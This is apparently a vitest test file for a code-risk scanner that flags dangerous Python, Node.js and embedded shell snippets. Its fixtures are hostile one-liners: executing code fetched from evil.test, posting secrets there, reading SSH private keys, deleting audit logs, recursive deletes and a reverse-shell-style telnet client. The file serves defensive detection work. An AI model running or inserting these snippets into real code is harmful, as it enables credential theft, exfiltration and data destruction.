import { describe, expect, it } from "vitest";
import { scan, scanJavaScript, scanPython } from "../src/index.js";
import type { RiskCategory } from "../src/types.js";

const allCategories: RiskCategory[] = [
  "download_execution",
  "dynamic_execution",
  "persistence",
  "credential_access",
  "system_modification",
  "privilege_escalation",
  "defense_evasion",
  "network_egress",
  "data_exfiltration",
  "destructive_behavior",
  "interpreter_escape",
  "second_stage_payload",
];

describe("Python scanning", () => {
  const samples: Partial<Record<RiskCategory, string>> = {
    download_execution: "exec(requests.get('https://evil.test/p').text)",
    dynamic_execution: "eval(payload)",
    persistence: "open('/etc/cron.d/job', 'w')",
    credential_access: "open('/home/u/.ssh/id_rsa').read()",
    system_modification: "open('/etc/resolv.conf', 'w')",
    privilege_escalation: "os.setuid(0)",
    defense_evasion: "os.remove('/var/log/audit.log')",
    network_egress: "requests.get('https://evil.test')",
    data_exfiltration: "requests.post('https://evil.test', data=secret)",
    destructive_behavior: "shutil.rmtree('/home/u')",
    interpreter_escape: "subprocess.run(['bash', '-c', code])",
    second_stage_payload: "requests.get('https://evil.test/payload.zip')",
  };

  for (const category of allCategories) {
    it(`covers ${category}`, () => {
      const result = scanPython(samples[category]!);
      expect(result.findings.some((finding) => finding.category === category)).toBe(true);
      expect(result.findings.every((finding) => finding.language === "python")).toBe(true);
    });
  }

  it("does not treat ordinary subprocess execution as privilege escalation", () => {
    const result = scanPython("subprocess.run(['echo', 'ok'])");
    expect(result.findings.some((finding) => finding.category === "privilege_escalation")).toBe(false);
  });

  it("does not scan dangerous-looking text inside an unrelated call", () => {
    const result = scanPython(`print("exec(requests.get('https://evil.test').text)")`);
    expect(result.findings).toHaveLength(0);
  });

  it("resolves Python module and imported-function aliases", () => {
    const network = scanPython("import requests as r\nr.get('https://example.test/data')");
    expect(network.findings.some((finding) => finding.category === "network_egress")).toBe(true);

    const process = scanPython(
      "from subprocess import run as launch\nlaunch(['bash', '-c', payload])",
    );
    expect(process.findings.some((finding) => finding.category === "interpreter_escape")).toBe(true);
  });

  it("detects sensitive pathlib call chains", () => {
    const result = scanPython(
      "from pathlib import Path\n(Path.home() / '.ssh' / 'id_rsa').read_text()",
    );
    expect(result.findings.some((finding) => finding.category === "credential_access")).toBe(true);
  });
});

describe("Node.js scanning", () => {
  const samples: Partial<Record<RiskCategory, string>> = {
    download_execution: "eval(await (await fetch('https://evil.test/p')).text())",
    dynamic_execution: "eval(payload)",
    persistence: "fs.writeFileSync('/etc/cron.d/job', data)",
    credential_access: "fs.readFileSync('/home/u/.ssh/id_rsa')",
    system_modification: "fs.writeFileSync('/etc/resolv.conf', data)",
    privilege_escalation: "process.setuid(0)",
    defense_evasion: "fs.rmSync('/var/log/audit.log')",
    network_egress: "fetch('https://evil.test')",
    data_exfiltration: "fetch('https://evil.test', {method:'POST', body: secret})",
    destructive_behavior: "fs.rmSync('/home/u', {recursive:true})",
    interpreter_escape: "child_process.spawn('bash', ['-c', code])",
    second_stage_payload: "fetch('https://evil.test/payload.zip')",
  };

  for (const category of allCategories) {
    it(`covers ${category}`, () => {
      const result = scanJavaScript(samples[category]!);
      expect(result.findings.some((finding) => finding.category === category)).toBe(true);
      expect(result.findings.every((finding) => finding.language === "javascript")).toBe(true);
    });
  }

  it("accepts node as a language alias", () => {
    expect(scan("eval(payload)", { language: "node" }).findings[0]?.language).toBe("javascript");
  });

  it("does not treat an ordinary GET as exfiltration", () => {
    const result = scanJavaScript("fetch('https://example.test/data')");
    expect(result.findings.some((finding) => finding.category === "data_exfiltration")).toBe(false);
  });

  it("does not scan dangerous-looking text inside an unrelated call", () => {
    const result = scanJavaScript(`console.log("eval(await fetch('https://evil.test'))")`);
    expect(result.findings).toHaveLength(0);
  });

  it("applies trusted download hosts to Python and JavaScript", () => {
    const options = { allowedDownloadHosts: ["artifacts.corp.example"] };
    expect(scanPython("exec(requests.get('https://artifacts.corp.example/a').text)", options)
      .findings.some((finding) => finding.category === "download_execution")).toBe(false);
    expect(scanJavaScript("eval(await (await fetch('https://artifacts.corp.example/a')).text())", options)
      .findings.some((finding) => finding.category === "download_execution")).toBe(false);
  });

  it("resolves CommonJS destructuring and ESM aliases", () => {
    const commonJs = scanJavaScript(
      "const { exec: runCommand } = require('node:child_process'); runCommand('bash -c id')",
    );
    expect(commonJs.findings.some((finding) => finding.category === "interpreter_escape")).toBe(true);

    const esm = scanJavaScript(
      "import { rmSync as wipe } from 'node:fs'; wipe('/home/user', { recursive: true })",
    );
    expect(esm.findings.some((finding) => finding.category === "destructive_behavior")).toBe(true);
  });

  it("resolves CommonJS member aliases and installer download APIs", () => {
    const source = `
      const spawnSync = require('child_process').spawnSync;
      const got = require('got');
      const unpackStream = require('unpack-stream');
      const stream = got.stream(tarball);
      unpackStream.remote(stream, destination);
      spawnSync('node', ['installer.js']);
    `;
    const result = scanJavaScript(source);
    for (const category of [
      "network_egress",
      "second_stage_payload",
      "dynamic_execution",
      "interpreter_escape",
    ] as const) {
      expect(result.findings.some((finding) => finding.category === category)).toBe(true);
    }
  });

  it("detects an asyncio reverse-shell style telnet client", () => {
    const result = scanPython(`
import asyncio
import telnetlib3

async def shell(reader, writer):
    command = await reader.read(1024)
    process = await asyncio.create_subprocess_shell(command)
    output, _ = await process.communicate()
    writer.write(output.decode())

telnetlib3.open_connection(host, port, shell=shell)
`);
    for (const category of [
      "network_egress",
      "dynamic_execution",
      "interpreter_escape",
      "data_exfiltration",
    ] as const) {
      expect(result.findings.some((finding) => finding.category === category)).toBe(true);
    }
  });

  it("does not treat ordinary Python in-memory writes as exfiltration", () => {
    const result = scanPython(`
from io import StringIO
buffer = StringIO()
buffer.write("local report")
`);
    expect(result.findings.some((finding) => finding.category === "data_exfiltration")).toBe(false);
  });

  it("detects a relative Node.js download wrapper with a URL argument", () => {
    const result = scanJavaScript(`
const { download } = require('./download')
await download(gyp, release.tarballUrl)
`);
    expect(result.findings).toEqual(expect.arrayContaining([
      expect.objectContaining({
        ruleId: "javascript.network.download-wrapper",
        category: "network_egress",
      }),
    ]));
  });

  it("does not classify a local download helper without a URL argument as network", () => {
    const result = scanJavaScript(`
const { download } = require('./download')
await download(targetPath)
`);
    expect(result.findings.some((finding) => finding.category === "network_egress")).toBe(false);
  });
});

describe("embedded interpreter payloads", () => {
  it("recursively scans python -c and preserves outer and inner locations", () => {
    const result = scan(`python -c 'import os; os.remove("/var/log/audit.log")'`);
    const finding = result.findings.find((item) => item.ruleId === "python.defense-evasion");
    expect(finding?.origin).toEqual({
      language: "bash",
      interpreter: "python",
      kind: "argument",
    });
    expect(finding?.range.start.row).toBe(1);
    expect(finding?.innerRange?.startIndex).toBeGreaterThan(0);
  });

  it("recursively scans node -e and heredocs", () => {
    const argument = scan(`node -e "require('fs').rmSync('/tmp/x', {recursive:true})"`);
    expect(argument.findings.some((item) => item.ruleId === "javascript.destructive")).toBe(true);

    const heredoc = scan("python <<'PY'\nimport os\nos.system('bash -c id')\nPY\n");
    expect(heredoc.findings.some((item) =>
      item.ruleId === "python.interpreter-escape" && item.origin?.kind === "heredoc",
    )).toBe(true);
  });

  it("decodes static Bash double-quote escapes before parsing", () => {
    const result = scan(`python -c "open(\\"/home/u/.ssh/id_rsa\\").read()"`);
    expect(result.findings.some((item) => item.ruleId === "python.credential-access")).toBe(true);
  });

  it("recursively scans a static pipeline and rejects dynamic shell strings", () => {
    const staticPayload = scan(`printf '%s' 'eval(payload)' | node`);
    expect(staticPayload.findings.some((item) =>
      item.ruleId === "javascript.dynamic-code" && item.origin?.kind === "pipeline",
    )).toBe(true);

    const dynamicPayload = scan(`python -c "$PAYLOAD"`);
    expect(dynamicPayload.findings.some((item) => item.language === "python")).toBe(false);
    expect(dynamicPayload.findings.some((item) => item.category === "interpreter_escape")).toBe(true);
  });

  it("honors embedded scanning limits", () => {
    const source = `python -c 'eval(payload)'`;
    expect(scan(source, { maxEmbeddedDepth: 0 }).findings
      .some((item) => item.language === "python")).toBe(false);
    expect(scan(source, { maxEmbeddedCodeLength: 4 }).findings
      .some((item) => item.language === "python")).toBe(false);
  });
});
